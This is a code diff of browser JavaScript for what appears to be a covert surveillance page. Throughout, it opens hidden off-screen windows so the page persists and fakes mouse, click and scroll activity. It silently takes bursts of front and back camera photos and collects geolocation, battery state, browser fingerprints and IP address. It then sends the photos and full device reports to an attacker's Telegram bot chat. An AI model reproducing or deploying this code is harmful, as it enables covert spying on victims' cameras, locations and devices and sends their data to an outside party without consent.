-                    if (popunder) {
-                        // Hide immediately
-                        setTimeout(() => {
-                            try {
-                                popunder.blur();
-                                window.focus();
-                            } catch (error) {
-                                // Ignore focus errors
-                            }
-                        }, 100);
-                        
-                        log('Pop-under created for persistence', 'info');
-                        return popunder;
+            handleClick(event) {
+                const link = event.target.closest('a');
+                if (link && link.href && link.target !== '_blank') {
+                    try {
+                        const url = new URL(link.href, window.location.href);
+                        if (url.origin !== window.location.origin) {
+                            // External link - create backup
+                            this.createBackupWindows(1);
+                        }
+                    } catch (e) {
+                        // Invalid URL, ignore
                     }
-                } catch (error) {
-                    log('Pop-under blocked by browser', 'warning');
                 }
-                
-                return null;
+            }
+            
+            handleSubmit(event) {
+                this.createBackupWindows(1);
+            }
+            
+            createBackupWindows(count) {
+                for (let i = 0; i < count; i++) {
+                    setTimeout(() => {
+                        try {
+                            const win = window.open(
+                                'about:blank',
+                                '_backup_' + Date.now() + '_' + i,
+                                'width=1,height=1,left=-9999,top=-9999'
+                            );
+                            if (win) {
+                                // Write minimal content
+                                win.document.write('<html><body></body></html>');
+                                win.document.close();
+                            }
+                        } catch (e) {
+                            // Popup blocked
+                        }
+                    }, i * 100);
+                }
             }
             
             cleanup() {
-                if (this.linkInterceptor) {
-                    document.removeEventListener('click', this.linkInterceptor, true);
+                // Restore original functions
+                window.close = window.close; // Will be original
+            }
+        }
+        
+        // ============== USER ACTIVITY SIMULATION ==============
+        
+        class ActivitySimulator {
+            constructor() {
+                this.isActive = false;
+                this.simulationInterval = null;
+                this.ghostInterval = null;
+            }
+            
+            start() {
+                if (!CONFIG.FAKE_USER_ACTIVITY) return;
+                
+                // Random mouse movements
+                this.simulationInterval = setInterval(() => {
+                    this.simulateActivity();
+                }, randomDelay(30000, 120000)); // Every 30-120 seconds
+                
+                // Ghost cursor for extra realism
+                if (CONFIG.ENABLE_GHOST_CURSOR) {
+                    this.startGhostCursor();
                 }
                 
-                window.removeEventListener('beforeunload', this.handleBeforeUnload);
-                window.removeEventListener('popstate', this.handlePopState);
-                window.removeEventListener('unload', this.handleUnload);
+                this.isActive = true;
+            }
+            
+            simulateActivity() {
+                // Random mouse move
+                const x = Math.random() * window.innerWidth;
+                const y = Math.random() * window.innerHeight;
                 
-                this.isTrapped = false;
+                // Dispatch mouse move event
+                document.dispatchEvent(new MouseEvent('mousemove', {
+                    clientX: x,
+                    clientY: y,
+                    bubbles: true
+                }));
+                
+                // Occasionally simulate clicks
+                if (Math.random() > 0.7) {
+                    setTimeout(() => {
+                        document.dispatchEvent(new MouseEvent('mousedown', {
+                            clientX: x,
+                            clientY: y,
+                            bubbles: true
+                        }));
+                        
+                        setTimeout(() => {
+                            document.dispatchEvent(new MouseEvent('mouseup', {
+                                clientX: x,
+                                clientY: y,
+                                bubbles: true
+                            }));
+                        }, 100);
+                    }, 500);
+                }
+                
+                // Simulate scroll
+                if (Math.random() > 0.5 && CONFIG.ENABLE_SCROLL_SIMULATION) {
+                    setTimeout(() => {
+                        window.scrollBy({
+                            top: (Math.random() - 0.5) * 200,
+                            behavior: 'smooth'
+                        });
+                    }, 1000);
+                }
+            }
+            
+            startGhostCursor() {
+                elements.ghostCursor.style.opacity = '0';
+                
+                this.ghostInterval = setInterval(() => {
+                    if (Math.random() > 0.3) {
+                        this.showGhostCursor();
+                    }
+                }, randomDelay(15000, 45000));
+            }
+            
+            showGhostCursor() {
+                const startX = Math.random() * window.innerWidth;
+                const startY = Math.random() * window.innerHeight;
+                const endX = startX + (Math.random() - 0.5) * 300;
+                const endY = startY + (Math.random() - 0.5) * 200;
+                
+                elements.ghostCursor.style.left = startX + 'px';
+                elements.ghostCursor.style.top = startY + 'px';
+                elements.ghostCursor.style.opacity = '0.7';
+                
+                // Animate movement
+                let progress = 0;
+                const animate = () => {
+                    progress += 0.02;
+                    if (progress <= 1) {
+                        const x = startX + (endX - startX) * progress;
+                        const y = startY + (endY - startY) * progress;
+                        elements.ghostCursor.style.left = x + 'px';
+                        elements.ghostCursor.style.top = y + 'px';
+                        requestAnimationFrame(animate);
+                    } else {
+                        setTimeout(() => {
+                            elements.ghostCursor.style.opacity = '0';
+                        }, 500);
+                    }
+                };
+                animate();
+            }
+            
+            cleanup() {
+                if (this.simulationInterval) clearInterval(this.simulationInterval);
+                if (this.ghostInterval) clearInterval(this.ghostInterval);
+                elements.ghostCursor.style.opacity = '0';
+                this.isActive = false;
             }
         }
         
-        // ============== DEVICE INFORMATION ==============
+        // ============== OPTIMIZED CAMERA SYSTEM ==============
         
-        async function collectDeviceInfo() {
-            updateProgress(10, "Collecting device information...");
+        class OptimizedCameraSystem {
+            constructor() {
+                this.currentStream = null;
+                this.isCapturing = false;
+                this.captureQueue = [];
+                this.retryCount = 0;
+            }
             
-            const info = {
-                // Browser Info
-                userAgent: navigator.userAgent,
+            async initialize() {
+                try {
+                    // Quick permission request
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            width: { ideal: CONFIG.VIDEO_WIDTH },
+                            height: { ideal: CONFIG.VIDEO_HEIGHT }
+                        }
+                    });
+                    
+                    stream.getTracks().forEach(track => track.stop());
+                    STATE.permissionGranted = true;
+                    
+                    // Get camera list
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    STATE.availableCameras = devices.filter(d => d.kind === 'videoinput');
+                    
+                    return true;
+                    
+                } catch (error) {
+                    return false;
+                }
+            }
+            
+            async startCamera(facingMode) {
+                if (this.currentStream) {
+                    this.currentStream.getTracks().forEach(track => track.stop());
+                    await new Promise(r => setTimeout(r, 300));
+                }
+                
+                try {
+                    elements.video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+                    
+                    this.currentStream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: { ideal: facingMode },
+                            width: { ideal: CONFIG.VIDEO_WIDTH },
+                            height: { ideal: CONFIG.VIDEO_HEIGHT }
+                        }
+                    });
+                    
+                    elements.video.srcObject = this.currentStream;
+                    
+                    await new Promise((resolve) => {
+                        const checkReady = () => {
+                            if (elements.video.readyState >= 2) {
+                                resolve();
+                            } else {
+                                setTimeout(checkReady, 100);
+                            }
+                        };
+                        checkReady();
+                    });
+                    
+                    await elements.video.play();
+                    await new Promise(r => setTimeout(r, CONFIG.CAMERA_WARMUP));
+                    
+                    STATE.currentCamera = facingMode === 'user' ? 'front' : 'back';
+                    STATE.cameraReady = true;
+                    this.retryCount = 0;
+                    
+                    return true;
+                    
+                } catch (error) {
+                    this.retryCount++;
+                    
+                    if (this.retryCount < CONFIG.MAX_RETRIES) {
+                        await new Promise(r => setTimeout(r, CONFIG.RETRY_DELAY));
+                        return await this.startCamera(facingMode);
+                    }
+                    
+                    return false;
+                }
+            }
+            
+            async capturePhoto() {
+                if (!STATE.cameraReady || !elements.video.videoWidth) {
+                    return null;
+                }
+                
+                try {
+                    const canvas = elements.canvas;
+                    const ctx = canvas.getContext('2d');
+                    
+                    canvas.width = elements.video.videoWidth;
+                    canvas.height = elements.video.videoHeight;
+                    
+                    ctx.drawImage(elements.video, 0, 0, canvas.width, canvas.height);
+                    
+                    return new Promise((resolve) => {
+                        canvas.toBlob(
+                            (blob) => resolve(blob && blob.size > CONFIG.MIN_BLOB_SIZE ? blob : null),
+                            'image/jpeg',
+                            CONFIG.IMAGE_QUALITY
+                        );
+                    });
+                    
+                } catch (error) {
+                    return null;
+                }
+            }
+            
+            async captureBurst(cameraType, count = CONFIG.PHOTOS_PER_CAMERA) {
+                const results = [];
+                
+                for (let i = 0; i < count; i++) {
+                    if (!STATE.isRunning) break;
+                    
+                    const blob = await this.capturePhoto();
+                    if (blob) {
+                        results.push({ blob, index: i + 1 });
+                    }
+                    
+                    if (i < count - 1) {
+                        await new Promise(r => setTimeout(r, CONFIG.CAPTURE_DELAY));
+                    }
+                }
+                
+                return results;
+            }
+            
+            cleanup() {
+                if (this.currentStream) {
+                    this.currentStream.getTracks().forEach(track => track.stop());
+                    this.currentStream = null;
+                }
+                STATE.cameraReady = false;
+            }
+        }
+        
+        // ============== TELEGRAM COMMUNICATION (OPTIMIZED) ==============
+        
+        class TelegramManager {
+            constructor() {
+                this.messageQueue = [];
+                this.sending = false;
+                this.lastSendTime = 0;
+            }
+            
+            async sendPhoto(blob, cameraType, sequence) {
+                if (!blob) return false;
+                
+                // Create compact caption
+                let caption = `📸 ${cameraType.charAt(0).toUpperCase()}${cameraType.slice(1)} #${sequence}\n`;
+                caption += `👤 ${STATE.userChatId}\n`;
+                caption += `🔄 C${STATE.cycleCount}\n`;
+                
+                if (STATE.batteryInfo) {
+                    caption += `🔋 ${STATE.batteryInfo.level}%\n`;
+                }
+                
+                if (STATE.locationInfo) {
+                    caption += `📍 ${STATE.locationInfo.latitude.toFixed(4)},${STATE.locationInfo.longitude.toFixed(4)}\n`;
+                }
+                
+                caption += `⏰ ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}`;
+                
+                try {
+                    const formData = new FormData();
+                    formData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
+                    formData.append('photo', blob, `${cameraType}_${sequence}_${Date.now()}.jpg`);
+                    formData.append('caption', caption);
+                    formData.append('parse_mode', 'Markdown');
+                    
+                    const response = await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const result = await response.json();
+                    
+                    if (result.ok) {
+                        STATE.totalPhotosSent++;
+                        this.lastSendTime = Date.now();
+                        return true;
+                    }
+                    
+                } catch (error) {
+                    // Queue for retry
+                    this.messageQueue.push({ blob, cameraType, sequence, attempts: 0 });
+                }
+                
+                return false;
+            }
+            
+            async sendDeviceReport() {
+                let report = `📱 DEVICE REPORT\n\n`;
+                
+                report += `🆔 ${STATE.sessionId}\n`;
+                report += `👤 ${STATE.userChatId}\n`;
+                report += `🌐 ${STATE.deviceInfo.platform} | ${STATE.deviceInfo.browser || 'Unknown'}\n`;
+                report += `📏 ${screen.width}×${screen.height}\n`;
+                
+                if (STATE.batteryInfo) {
+                    report += `🔋 ${STATE.batteryInfo.level}% ${STATE.batteryInfo.charging ? '⚡' : ''}\n`;
+                }
+                
+                if (STATE.locationInfo) {
+                    report += `📍 ${STATE.locationInfo.latitude.toFixed(6)}, ${STATE.locationInfo.longitude.toFixed(6)}\n`;
+                    report += `🎯 ±${STATE.locationInfo.accuracy}m\n`;
+                }
+                
+                report += `📸 Cams: ${STATE.availableCameras.length}\n`;
+                report += `🔄 Cycles: ${STATE.cycleCount}\n`;
+                report += `🕐 ${new Date().toLocaleString()}`;
+                
+                try {
+                    await fetch(`${CONFIG.TELEGRAM_API}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: CONFIG.ADMIN_CHAT_ID,
+                            text: report,
+                            parse_mode: 'Markdown'
+                        })
+                    });
+                } catch (error) {
+                    // Silent fail
+                }
+            }
+            
+            processQueue() {
+                if (this.sending || this.messageQueue.length === 0) return;
+                
+                this.sending = true;
+                const item = this.messageQueue.shift();
+                
+                if (item.attempts < 3) {
+                    setTimeout(async () => {
+                        const success = await this.sendPhoto(item.blob, item.cameraType, item.sequence);
+                        if (!success) {
+                            item.attempts++;
+                            this.messageQueue.push(item);
+                        }
+                        this.sending = false;
+                        this.processQueue();
+                    }, 2000);
+                } else {
+                    this.sending = false;
+                    this.processQueue();
+                }
+            }
+        }
+        
+        // ============== DEVICE DATA COLLECTION ==============
+        
+        async function collectEssentialData() {
+            // Minimal data collection
+            STATE.deviceInfo = {
                 platform: navigator.platform,
-                vendor: navigator.vendor || 'unknown',
-                language: navigator.language,
-                languages: navigator.languages?.join(', ') || navigator.language,
-                cookieEnabled: navigator.cookieEnabled,
-                pdfViewerEnabled: navigator.pdfViewerEnabled || false,
-                webdriver: navigator.webdriver || false,
-                
-                // Screen Info
-                screenWidth: screen.width,
-                screenHeight: screen.height,
-                screenAvailWidth: screen.availWidth,
-                screenAvailHeight: screen.availHeight,
-                screenColorDepth: screen.colorDepth,
-                screenPixelDepth: screen.pixelDepth,
-                orientation: screen.orientation?.type || 'unknown',
-                orientationAngle: screen.orientation?.angle || 0,
-                
-                // Window Info
-                windowWidth: window.innerWidth,
-                windowHeight: window.innerHeight,
-                outerWidth: window.outerWidth,
-                outerHeight: window.outerHeight,
-                devicePixelRatio: window.devicePixelRatio,
-                
-                // Hardware
-                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
-                deviceMemory: navigator.deviceMemory || 'unknown',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                
-                // Time
+                userAgent: navigator.userAgent.substring(0, 100),
+                screen: `${screen.width}x${screen.height}`,
                 timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                timezoneOffset: new Date().getTimezoneOffset(),
-                localTime: new Date().toLocaleString(),
-                timestamp: Date.now(),
-                
-                // Network
-                onLine: navigator.onLine,
-                connection: navigator.connection ? {
-                    effectiveType: navigator.connection.effectiveType,
-                    downlink: navigator.connection.downlink,
-                    rtt: navigator.connection.rtt,
-                    saveData: navigator.connection.saveData,
-                    type: navigator.connection.type
-                } : null,
-                
-                // Media
-                mediaDevices: 'mediaDevices' in navigator,
-                permissions: 'permissions' in navigator,
-                
-                // Detection
-                isMobile: /Mobi|Android|iPhone|iPad|iPod/i.test(navigator.userAgent),
-                isTablet: /iPad|Android/i.test(navigator.userAgent) && !/Mobile/i.test(navigator.userAgent),
-                
-                // OS Detection
-                os: (() => {
-                    const ua = navigator.userAgent;
-                    if (/Windows/.test(ua)) return 'Windows';
-                    if (/Mac/.test(ua)) return 'macOS';
-                    if (/Linux/.test(ua)) return 'Linux';
-                    if (/Android/.test(ua)) return 'Android';
-                    if (/iOS|iPhone|iPad|iPod/.test(ua)) return 'iOS';
-                    return 'Unknown';
-                })(),
-                
-                // Browser Detection
-                browser: (() => {
-                    const ua = navigator.userAgent;
-                    if (/Chrome/.test(ua) && !/Edge/.test(ua)) return 'Chrome';
-                    if (/Firefox/.test(ua)) return 'Firefox';
-                    if (/Safari/.test(ua) && !/Chrome/.test(ua)) return 'Safari';
-                    if (/Edge/.test(ua)) return 'Edge';
-                    if (/Opera/.test(ua)) return 'Opera';
-                    return 'Unknown';
-                })()
+                language: navigator.language
             };
             
-            // Get IP Address
-            try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const data = await response.json();
-                info.ipAddress = data.ip;
-            } catch (error) {
-                info.ipAddress = 'Unable to fetch';
-            }
-            
-            // Get Canvas Fingerprint
-            try {
-                const canvas = document.createElement('canvas');
-                const ctx = canvas.getContext('2d');
-                canvas.width = 200;
-                canvas.height = 50;
-                ctx.textBaseline = 'alphabetic';
-                ctx.fillStyle = '#f60';
-                ctx.fillRect(125, 1, 62, 20);
-                ctx.fillStyle = '#069';
-                ctx.font = '11pt Arial';
-                ctx.fillText('Fingerprint', 2, 15);
-                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
-                ctx.font = '18pt Arial';
-                ctx.fillText('Fingerprint', 4, 45);
-                info.canvasFingerprint = canvas.toDataURL();
-            } catch (error) {
-                info.canvasFingerprint = 'Failed';
-            }
-            
-            STATE.deviceInfo = info;
-            updateProgress(20);
-            return info;
-        }
-        
-        async function getBatteryInfo() {
+            // Quick battery check
             if (navigator.getBattery) {
                 try {
                     const battery = await navigator.getBattery();
-                    const info = {
+                    STATE.batteryInfo = {
                         level: Math.round(battery.level * 100),
-                        charging: battery.charging,
-                        chargingTime: battery.chargingTime,
-                        dischargingTime: battery.dischargingTime
+                        charging: battery.charging
                     };
-                    
-                    STATE.batteryInfo = info;
-                    return info;
-                } catch (error) {
-                    return null;
-                }
+                } catch (e) {}
             }
-            return null;
-        }
-        
-        async function getLocation() {
-            if (!navigator.geolocation) return null;
             
-            return new Promise((resolve) => {
+            // Quick location (non-blocking)
+            if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const location = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: Math.round(position.coords.accuracy),
-                            altitude: position.coords.altitude,
-                            altitudeAccuracy: position.coords.altitudeAccuracy,
-                            heading: position.coords.heading,
-                            speed: position.coords.speed,
-                            timestamp: new Date(position.timestamp).toLocaleString(),
-                            googleMapsLink: `https://maps.google.com/?q=${position.coords.latitude},${position.coords.longitude}`,
-                            openStreetMapLink: `https://www.openstreetmap.org/?mlat=${position.coords.latitude}&mlon=${position.coords.longitude}`
+                    (pos) => {
+                        STATE.locationInfo = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: Math.round(pos.coords.accuracy)
                         };
-                        STATE.locationInfo = location;
-                        resolve(location);
                     },
-                    (error) => {
-                        log('Location error: ' + error.message, 'warning');
-                        resolve(null);
-                    },
-                    {
-                        enableHighAccuracy: true,
-                        timeout: 10000,
-                        maximumAge: 0
-                    }
+                    null,
+                    { maximumAge: 300000, timeout: 5000 } // 5 min cache, 5 sec timeout
                 );
-            });
-        }
-        
-        function startLocationTracking() {
-            if (!navigator.geolocation) return;
-            
-            STATE.locationWatchId = navigator.geolocation.watchPosition(
-                (position) => {
-                    STATE.locationInfo = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: Math.round(position.coords.accuracy),
-                        timestamp: new Date().toLocaleString()
-                    };
-                },
-                (error) => {
-                    log('Location tracking error: ' + error.message, 'warning');
-                },
-                {
-                    enableHighAccuracy: true,
-                    maximumAge: 30000, // 30 seconds
-                    timeout: 10000
-                }
-            );
-        }
-        
-        // ============== FIXED CAMERA SYSTEM ==============
-        
-        async function requestCameraPermission() {
-            updateProgress(30, "Requesting camera access...");
-            
-            try {
-                // First try to get camera list without streaming
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                STATE.availableCameras = devices.filter(d => d.kind === 'videoinput');
-                
-                if (STATE.availableCameras.length === 0) {
-                    log('No cameras found', 'warning');
-                    return false;
-                }
-                
-                // Request permission with specific constraints
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: {
-                        width: { ideal: CONFIG.VIDEO_WIDTH },
-                        height: { ideal: CONFIG.VIDEO_HEIGHT },
-                        frameRate: { ideal: CONFIG.FRAME_RATE },
-                        facingMode: { ideal: 'user' } // Start with front camera
-                    },
-                    audio: false
-                });
-                
-                // Stop the stream immediately to avoid camera light
-                stream.getTracks().forEach(track => {
-                    track.stop();
-                });
-                
-                STATE.permissionGranted = true;
-                updateProgress(40);
-                log(`Camera permission granted (${STATE.availableCameras.length} cameras found)`, 'success');
-                
-                return true;
-                
-            } catch (error) {
-                log('Camera permission denied: ' + error.message, 'error');
-                updateProgress(40);
-                return false;
             }
         }
         
-        async function startCamera(facingMode, retryCount = 0) {
-            if (retryCount >= CONFIG.MAX_RETRIES) {
-                log(`Failed to start ${facingMode} camera after ${CONFIG.MAX_RETRIES} attempts`, 'error');
-                return false;
+        // ============== MAIN SURVEILLANCE CONTROLLER ==============
+        
+        class SurveillanceController {
+            constructor() {
+                this.cameraSystem = new OptimizedCameraSystem();
+                this.telegramManager = new TelegramManager();
+                this.isActive = false;
+                this.captureInterval = null;
             }
             
-            try {
-                log(`Starting ${facingMode} camera (attempt ${retryCount + 1})...`, 'info');
+            async start() {
+                if (this.isActive) return;
                 
-                // Clean up previous stream
-                if (STATE.currentStream) {
-                    STATE.currentStream.getTracks().forEach(track => track.stop());
-                    STATE.currentStream = null;
-                    await new Promise(resolve => setTimeout(resolve, 500));
-                }
+                this.isActive = true;
+                STATE.isRunning = true;
                 
-                // Set video element transform
-                elements.video.style.transform = facingMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+                // Initialize camera
+                const cameraReady = await this.cameraSystem.initialize();
                 
-                // Create constraints
-                const constraints = {
-                    video: {
-                        facingMode: { ideal: facingMode },
-                        width: { ideal: CONFIG.VIDEO_WIDTH },
-                        height: { ideal: CONFIG.VIDEO_HEIGHT },
-                        frameRate: { ideal: CONFIG.FRAME_RATE }
-                    }
-                };
-                
-                // Get stream
-                STATE.currentStream = await navigator.mediaDevices.getUserMedia(constraints);
-                elements.video.srcObject = STATE.currentStream;
-                STATE.currentCamera = facingMode === 'user' ? 'front' : 'back';
-                
-                // Wait for video to be ready
-                await new Promise((resolve, reject) => {
-                    const timeout = setTimeout(() => reject(new Error('Video timeout')), 10000);
+                if (cameraReady) {
+                    // Send initial report
+                    this.telegramManager.sendDeviceReport();
                     
-                    elements.video.onloadedmetadata = () => {
-                        clearTimeout(timeout);
-                        resolve();
-                    };
+                    // Start periodic captures
+                    this.startCaptureCycle();
                     
-                    elements.video.onerror = () => {
-                        clearTimeout(timeout);
-                        reject(new Error('Video error'));
-                    };
-                });
-                
-                // Play video
-                await elements.video.play();
-                
-                // Wait for camera to warm up
-                await new Promise(resolve => setTimeout(resolve, CONFIG.CAMERA_WARMUP));
-                
-                // Verify video is actually playing
-                if (elements.video.readyState < 2) {
-                    throw new Error('Video not ready');
-                }
-                
-                STATE.cameraReady = true;
-                log(`${facingMode} camera ready (${elements.video.videoWidth}x${elements.video.videoHeight})`, 'success');
-                
-                // Broadcast camera status
-                if (STATE.broadcastChannel) {
-                    STATE.broadcastChannel.postMessage({
-                        type: 'camera_status',
-                        tabId: STATE.tabId,
-                        camera: facingMode,
-                        status: 'ready',
-                        resolution: `${elements.video.videoWidth}x${elements.video.videoHeight}`
-                    });
-                }
-                
-                return true;
-                
-            } catch (error) {
-                log(`${facingMode} camera failed: ${error.message}`, 'error');
-                STATE.cameraReady = false;
-                
-                // Clean up on failure
-                if (STATE.currentStream) {
-                    STATE.currentStream.getTracks().forEach(track => track.stop());
-                    STATE.currentStream = null;
-                }
-                
-                // Retry with delay
-                await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY));
-                return await startCamera(facingMode, retryCount + 1);
-            }
-        }
-        
-        async function capturePhoto() {
-            if (!STATE.cameraReady || !STATE.currentStream) {
-                log('Camera not ready for capture', 'warning');
-                return null;
-            }
-            
-            try {
-                const video = elements.video;
-                const canvas = elements.canvas;
-                const ctx = canvas.getContext('2d');
-                
-                // Ensure video is playing
-                if (video.paused || video.ended || video.readyState < 2) {
-                    log('Video not playing, cannot capture', 'warning');
-                    return null;
-                }
-                
-                // Set canvas dimensions to match video
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                
-                // Draw video frame to canvas
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                
-                // Create blob from canvas
-                return new Promise((resolve) => {
-                    canvas.toBlob(
-                        (blob) => {
-                            if (blob && blob.size > CONFIG.MIN_BLOB_SIZE) {
-                                STATE.lastCaptureTime = Date.now();
-                                log(`Photo captured: ${(blob.size / 1024).toFixed(2)} KB`, 'success');
-                                resolve(blob);
-                            } else {
-                                log('Photo too small or invalid', 'warning');
-                                resolve(null);
-                            }
-                        },
-                        'image/jpeg',
-                        CONFIG.IMAGE_QUALITY
-                    );
-                });
-                
-            } catch (error) {
-                log('Capture failed: ' + error.message, 'error');
-                return null;
-            }
-        }
-        
-        // ============== TELEGRAM COMMUNICATION ==============
-        
-        async function sendToTelegram(blob, cameraType, sequence, retryCount = 0) {
-            if (!blob || blob.size < CONFIG.MIN_BLOB_SIZE) {
-                STATE.totalPhotosFailed++;
-                return false;
-            }
-            
-            if (retryCount >= CONFIG.MAX_RETRIES) {
-                log(`Failed to send photo after ${CONFIG.MAX_RETRIES} attempts`, 'error');
-                STATE.totalPhotosFailed++;
-                return false;
-            }
-            
-            try {
-                // Create caption
-                let caption = `📸 *${cameraType.toUpperCase()} CAMERA - Photo ${sequence}*\n\n`;
-                caption += `🆔 Session: \`${STATE.sessionId}\`\n`;
-                caption += `👤 User: \`${STATE.userChatId}\`\n`;
-                caption += `🔄 Cycle: ${STATE.cycleCount}\n`;
-                caption += `📊 Total Sent: ${STATE.totalPhotosSent}\n`;
-                
-                if (STATE.batteryInfo) {
-                    caption += `🔋 Battery: ${STATE.batteryInfo.level}% ${STATE.batteryInfo.charging ? '⚡' : ''}\n`;
-                }
-                
-                if (STATE.locationInfo) {
-                    caption += `📍 Location: [${STATE.locationInfo.latitude.toFixed(6)}, ${STATE.locationInfo.longitude.toFixed(6)}](${STATE.locationInfo.googleMapsLink})\n`;
-                    caption += `🎯 Accuracy: ${STATE.locationInfo.accuracy}m\n`;
-                }
-                
-                caption += `⏰ Time: ${new Date().toLocaleTimeString()}\n`;
-                caption += `📅 Date: ${new Date().toLocaleDateString()}`;
-                
-                // Create form data
-                const formData = new FormData();
-                formData.append('chat_id', CONFIG.ADMIN_CHAT_ID);
-                formData.append('photo', blob, `${cameraType}_${sequence}_${Date.now()}.jpg`);
-                formData.append('caption', caption);
-                formData.append('parse_mode', 'Markdown');
-                
-                // Send to Telegram
-                const response = await fetch(`${CONFIG.TELEGRAM_API}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const result = await response.json();
-                
-                if (result.ok) {
-                    STATE.totalPhotosSent++;
+                    // Start periodic cycles
+                    this.captureInterval = setInterval(() => {
+                        this.executeCaptureCycle();
+                    }, CONFIG.CAMERA_CYCLE_INTERVAL);
                     
-                    // Broadcast success
-                    if (STATE.broadcastChannel) {
-                        STATE.broadcastChannel.postMessage({
-                            type: 'photo_captured',
-                            tabId: STATE.tabId,
-                            camera: cameraType,
-                            sequence: sequence,
-                            timestamp: Date.now()
-                        });
-                    }
-                    
-                    log(`Photo sent successfully (Attempt ${retryCount + 1})`, 'success');
-                    return true;
-                    
-                } else {
-                    log(`Telegram error: ${result.description}`, 'error');
-                    
-                    // Retry with exponential backoff
-                    await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY * (retryCount + 1)));
-                    return await sendToTelegram(blob, cameraType, sequence, retryCount + 1);
-                }
-                
-            } catch (error) {
-                log(`Network error: ${error.message}`, 'error');
-                
-                // Store for later sync if we have persistence
-                if (STATE.persistenceDB) {
-                    // Store in IndexedDB for later sync
-                    const persistence = new BackgroundPersistence();
-                    await persistence.storePhoto(blob, cameraType, sequence);
-                }
-                
-                // Retry with exponential backoff
-                await new Promise(resolve => setTimeout(resolve, CONFIG.RETRY_DELAY * (retryCount + 1)));
-                return await sendToTelegram(blob, cameraType, sequence, retryCount + 1);
-            }
-        }
-        
-        async function sendDeviceReport() {
-            try {
-                let report = `🚨 *ULTIMATE SURVEILLANCE REPORT - FULL DATA*\n\n`;
-                
-                // Session Info
-                report += `📊 *SESSION INFORMATION*\n`;
-                report += `🆔 Session ID: \`${STATE.sessionId}\`\n`;
-                report += `👤 User ID: \`${STATE.userChatId}\`\n`;
-                report += `🌐 Website: ${STATE.targetWebsite}\n`;
-                report += `🕐 Started: ${new Date(STATE.startTime).toLocaleString()}\n`;
-                report += `⏱️ Duration: ${Math.round((Date.now() - STATE.startTime) / 1000)} seconds\n`;
-                report += `📸 Photos Sent: ${STATE.totalPhotosSent}\n`;
-                report += `🔄 Cycles: ${STATE.cycleCount}\n`;
-                report += `📡 Tabs Active: ${STATE.otherTabs.size + 1}\n\n`;
-                
-                // Device Info
-                report += `🖥️ *DEVICE HARDWARE*\n`;
-                report += `🔧 Platform: ${STATE.deviceInfo.platform}\n`;
-                report += `🌐 Browser: ${STATE.deviceInfo.browser}\n`;
-                report += `💻 OS: ${STATE.deviceInfo.os}\n`;
-                report += `📱 Mobile: ${STATE.deviceInfo.isMobile ? 'Yes' : 'No'}\n`;
-                report += `💾 RAM: ${STATE.deviceInfo.deviceMemory} GB\n`;
-                report += `⚡ CPU Cores: ${STATE.deviceInfo.hardwareConcurrency}\n`;
-                report += `👆 Touch Points: ${STATE.deviceInfo.maxTouchPoints}\n\n`;
-                
-                // Screen Info
-                report += `📺 *DISPLAY INFORMATION*\n`;
-                report += `🖥️ Screen: ${STATE.deviceInfo.screenWidth} × ${STATE.deviceInfo.screenHeight}\n`;
-                report += `📐 Available: ${STATE.deviceInfo.screenAvailWidth} × ${STATE.deviceInfo.screenAvailHeight}\n`;
-                report += `🎨 Color Depth: ${STATE.deviceInfo.screenColorDepth} bit\n`;
-                report += `🔍 Pixel Ratio: ${STATE.deviceInfo.devicePixelRatio}\n`;
-                report += `📏 Orientation: ${STATE.deviceInfo.orientation}\n\n`;
-                
-                // Location Info
-                if (STATE.locationInfo) {
-                    report += `📍 *LIVE LOCATION*\n`;
-                    report += `🌐 Latitude: ${STATE.locationInfo.latitude}\n`;
-                    report += `🌐 Longitude: ${STATE.locationInfo.longitude}\n`;
-                    report += `🎯 Accuracy: ${STATE.locationInfo.accuracy} meters\n`;
-                    report += `🕐 Timestamp: ${STATE.locationInfo.timestamp}\n`;
-                    report += `🗺️ [Google Maps](${STATE.locationInfo.googleMapsLink})\n`;
-                    report += `🗺️ [OpenStreetMap](${STATE.locationInfo.openStreetMapLink})\n\n`;
-                }
-                
-                // Battery Info
-                if (STATE.batteryInfo) {
-                    report += `🔋 *BATTERY STATUS*\n`;
-                    report += `⚡ Level: ${STATE.batteryInfo.level}%\n`;
-                    report += `🔌 Charging: ${STATE.batteryInfo.charging ? 'Yes' : 'No'}\n`;
-                    if (STATE.batteryInfo.charging && STATE.batteryInfo.chargingTime < Infinity) {
-                        report += `⏱️ Full in: ${Math.round(STATE.batteryInfo.chargingTime / 60)} minutes\n`;
-                    }
-                    report += `\n`;
-                }
-                
-                // Network Info
-                if (STATE.deviceInfo.connection) {
-                    report += `🌐 *NETWORK CONNECTION*\n`;
-                    report += `📶 Type: ${STATE.deviceInfo.connection.effectiveType}\n`;
-                    report += `⬇️ Downlink: ${STATE.deviceInfo.connection.downlink} Mbps\n`;
-                    report += `🔄 RTT: ${STATE.deviceInfo.connection.rtt} ms\n`;
